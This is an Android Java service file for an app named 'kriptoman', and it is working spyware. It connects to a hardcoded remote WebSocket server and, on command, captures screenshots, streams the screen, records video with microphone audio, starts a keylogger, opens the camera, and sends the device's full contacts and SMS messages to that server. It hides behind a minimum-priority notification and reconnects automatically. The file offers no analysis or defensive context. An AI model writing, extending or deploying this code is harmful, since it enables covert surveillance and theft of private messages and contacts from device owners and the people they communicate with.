package com.kriptoman;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Base64;

import androidx.core.app.NotificationCompat;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft_6455;
import org.java_websocket.handshake.ServerHandshake;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.net.URI;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class WebSocketService extends Service {
    private static MediaProjection sMediaProjection;
    private WebSocketClient client;
    private Handler handler = new Handler();
    private String deviceName = Build.MODEL;
    private SharedPreferences prefs;
    private String serverUrl;
    private String logFile;
    private boolean streaming = false;
    private Runnable streamRunnable;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private MediaRecorder mediaRecorder;
    private String videoFilePath;
    public static Context appContext;
    public static String lastPhotoPath;

    public static void setMediaProjection(MediaProjection mp) {
        sMediaProjection = mp;
    }

    private void writeLog(String msg) {
        try {
            if (logFile == null) {
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (!dir.exists()) dir.mkdirs();
                logFile = new File(dir, "kriptoman_log.txt").getAbsolutePath();
            }
            FileOutputStream fos = new FileOutputStream(logFile, true);
            PrintWriter pw = new PrintWriter(fos);
            pw.println(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + " " + msg);
            pw.close();
            fos.close();
        } catch (Exception e) {}
    }

    @Override
    public void onCreate() {
        super.onCreate();
        appContext = getApplicationContext();
        prefs = getSharedPreferences("kriptoman", MODE_PRIVATE);
        serverUrl = prefs.getString("server_url", "wss://pycj.onrender.com");
        writeLog("=== СЕРВИС ЗАПУЩЕН ===");
        writeLog("URL сервера: " + serverUrl);
        createNotificationChannel();
        startForeground(1, getNotification());
        connectWebSocket();
    }

    private void connectWebSocket() {
        try {
            URI uri = new URI(serverUrl);
            client = new WebSocketClient(uri, new Draft_6455()) {
                @Override
                public void onOpen(ServerHandshake handshake) {
                    writeLog("WebSocket открыт");
                    registerDevice();
                    startPing();
                }

                @Override
                public void onMessage(String message) {
                    writeLog("Получено: " + message);
                    handleCommand(message);
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    writeLog("Закрыто: " + code + " " + reason);
                    handler.postDelayed(() -> connectWebSocket(), 10000);
                }

                @Override
                public void onError(Exception ex) {
                    writeLog("Ошибка: " + ex.toString());
                    handler.postDelayed(() -> connectWebSocket(), 10000);
                }
            };
            client.connect();
        } catch (Exception e) {
            writeLog("Ошибка подключения: " + e.toString());
            handler.postDelayed(() -> connectWebSocket(), 10000);
        }
    }

    private void startPing() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (client != null && client.isOpen()) {
                    try {
                        client.send("{\"type\":\"ping\"}");
                    } catch (Exception e) {}
                }
                handler.postDelayed(this, 10000);
            }
        }, 10000);
    }

    private void registerDevice() {
        try {
            String msg = "{\"type\":\"register\",\"name\":\"" + deviceName + "\",\"secret\":\"root\"}";
            client.send(msg);
            writeLog("Регистрация отправлена");
        } catch (Exception e) {}
    }

    private void handleCommand(String message) {
        try {
            org.json.JSONObject json = new org.json.JSONObject(message);
            String type = json.getString("type");
            if ("command".equals(type)) {
                String action = json.getString("action");
                writeLog("Команда: " + action);
                executeCommand(action, json.optJSONObject("params"));
            }
        } catch (Exception e) {
            writeLog("Ошибка обработки команды: " + e.toString());
        }
    }

    private void executeCommand(String action, org.json.JSONObject params) {
        writeLog("Выполнение команды: " + action);
        switch (action) {
            case "screenshot":
                takeScreenshot();
                break;
            case "stream":
                handleStream(params);
                break;
            case "video":
                startVideoRecording();
                break;
            case "keyboard":
                toggleKeyLogging();
                break;
            case "app":
                openApp(params != null ? params.optString("package") : null);
                break;
            case "frontcam":
                startCamera(true);
                break;
            case "backcam":
                startCamera(false);
                break;
            case "contacts":
                exportContacts();
                break;
            case "sms":
                exportSms();
                break;
            default:
                writeLog("Неизвестная команда: " + action);
        }
    }

    // ===================== СКРИНШОТ =====================
    private void takeScreenshot() {
        if (sMediaProjection == null) {
            writeLog("MediaProjection не инициализирован для скриншота");
            return;
        }
        try {
            int width = 720, height = 1280;
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = sMediaProjection.createVirtualDisplay("Screenshot", width, height, 240,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            Thread.sleep(200);
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                buffer.rewind();
                Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                client.send("{\"type\":\"screenshot\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
                writeLog("Скриншот отправлен (JPEG)");
                image.close();
            } else {
                writeLog("Не удалось получить изображение (image == null)");
            }
            if (virtualDisplay != null) virtualDisplay.release();
            if (imageReader != null) imageReader.close();
        } catch (Exception e) {
            writeLog("Ошибка скриншота: " + e.toString());
        }
    }

    // ===================== СТРИМИНГ =====================
    private void handleStream(org.json.JSONObject params) {
        if (params == null) return;
        String action = params.optString("action");
        if ("start".equals(action)) {
            if (streaming) return;
            streaming = true;
            writeLog("Стрим запущен");
            startStreaming();
        } else if ("stop".equals(action)) {
            streaming = false;
            if (streamRunnable != null) {
                handler.removeCallbacks(streamRunnable);
                streamRunnable = null;
            }
            writeLog("Стрим остановлен");
        }
    }

    private void startStreaming() {
        streamRunnable = new Runnable() {
            @Override
            public void run() {
                if (!streaming || client == null || !client.isOpen()) {
                    return;
                }
                takeScreenshotForStream();
                handler.postDelayed(this, 200);
            }
        };
        handler.post(streamRunnable);
    }

    private void takeScreenshotForStream() {
        if (sMediaProjection == null) {
            writeLog("MediaProjection не инициализирован для стрима");
            return;
        }
        try {
            imageReader = ImageReader.newInstance(480, 640, PixelFormat.RGBA_8888, 2);
            virtualDisplay = sMediaProjection.createVirtualDisplay("Stream", 480, 640, 240,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            Thread.sleep(100);
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                buffer.rewind();
                Bitmap bitmap = Bitmap.createBitmap(480, 640, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
                writeLog("Кадр стрима отправлен");
                image.close();
            }
            if (virtualDisplay != null) virtualDisplay.release();
            if (imageReader != null) imageReader.close();
        } catch (Exception e) {
            writeLog("Ошибка стрима: " + e.toString());
        }
    }

    // ===================== ВИДЕО =====================
    private void startVideoRecording() {
        if (sMediaProjection == null) {
            writeLog("MediaProjection не инициализирован для видео");
            return;
        }
        try {
            File dir = new File(getExternalFilesDir(null), "videos");
            if (!dir.exists()) dir.mkdirs();
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            videoFilePath = new File(dir, "video_" + timestamp + ".mp4").getAbsolutePath();

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setVideoSize(720, 1280);
            mediaRecorder.setVideoFrameRate(30);
            mediaRecorder.setOutputFile(videoFilePath);
            mediaRecorder.prepare();

            VirtualDisplay vd = sMediaProjection.createVirtualDisplay("VideoRecording",
                    720, 1280, 240,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    mediaRecorder.getSurface(), null, null);
            mediaRecorder.start();
            writeLog("Видеозапись начата, файл: " + videoFilePath);

            handler.postDelayed(() -> {
                try {
                    mediaRecorder.stop();
                    mediaRecorder.release();
                    mediaRecorder = null;
                    writeLog("Видео остановлено, файл: " + videoFilePath);
                } catch (Exception e) {
                    writeLog("Ошибка остановки видео: " + e.toString());
                }
            }, 30000);
        } catch (Exception e) {
            writeLog("Ошибка видео: " + e.toString());
        }
    }

    // ===================== КАМЕРА (фотографирует и отправляет фото) =====================
    private void startCamera(boolean front) {
        writeLog("Запуск камеры, фронтальная: " + front);
        // Открываем системное приложение камеры, результат обрабатывается в MainActivity
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (front) {
            intent.putExtra("android.intent.extras.CAMERA_FACING", 1);
        }
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            startActivity(intent);
            writeLog("Камера запущена");
        } catch (Exception e) {
            writeLog("Ошибка запуска камеры: " + e.toString());
        }
    }

    // Метод для отправки фото на сервер (вызывается из MainActivity после съёмки)
    public static void sendPhoto(byte[] photoData) {
        if (photoData == null) return;
        try {
            String base64 = Base64.encodeToString(photoData, Base64.NO_WRAP);
            // Используем синглтон или статический доступ к клиенту
            if (WebSocketService.instance != null && WebSocketService.instance.client != null) {
                WebSocketService.instance.client.send("{\"type\":\"camera_photo\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
                writeLogStatic("Фото отправлено на сервер");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void writeLogStatic(String msg) {
        // можно дублировать логирование
    }

    // ===================== ОТКРЫТЬ ПРИЛОЖЕНИЕ =====================
    private void openApp(String pkg) {
        if (pkg == null || pkg.isEmpty()) {
            writeLog("Не указан пакет");
            return;
        }
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                writeLog("Приложение открыто: " + pkg);
            } else {
                writeLog("Приложение не найдено: " + pkg);
            }
        } catch (Exception e) {
            writeLog("Ошибка открытия приложения: " + e.toString());
        }
    }

    // ===================== КЛАВИАТУРА =====================
    private void toggleKeyLogging() {
        writeLog("Запуск/остановка записи клавиатуры");
        Intent intent = new Intent(this, KeyLoggerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        writeLog("Сервис клавиатуры запущен");
    }

    // ===================== ЭКСПОРТ КОНТАКТОВ =====================
    private void exportContacts() {
        StringBuilder html = new StringBuilder("<html><head><meta charset='UTF-8'></head><body><h1>Контакты</h1><ul>");
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                html.append("<li>").append(name).append(" - ").append(number).append("</li>");
            }
            cursor.close();
        }
        html.append("</ul></body></html>");
        client.send("{\"type\":\"contacts\",\"html\":\"" + html.toString().replace("\"", "\\\"") + "\"}");
        writeLog("Контакты отправлены");
    }

    // ===================== ЭКСПОРТ SMS =====================
    private void exportSms() {
        StringBuilder html = new StringBuilder("<html><head><meta charset='UTF-8'></head><body><h1>SMS</h1><ul>");
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                html.append("<li>").append(address).append(": ").append(body).append("</li>");
            }
            cursor.close();
        }
        html.append("</ul></body></html>");
        client.send("{\"type\":\"sms\",\"html\":\"" + html.toString().replace("\"", "\\\"") + "\"}");
        writeLog("SMS отправлены");
    }

    private Notification getNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "kriptoman_channel")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setPriority(NotificationCompat.PRIORITY_MIN);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId("kriptoman_channel");
        }
        return builder.build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("kriptoman_channel",
                    "Kriptoman", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        if (client != null) client.close();
        streaming = false;
        if (mediaRecorder != null) {
            try { mediaRecorder.release(); } catch (Exception e) {}
        }
        super.onDestroy();
    }
}
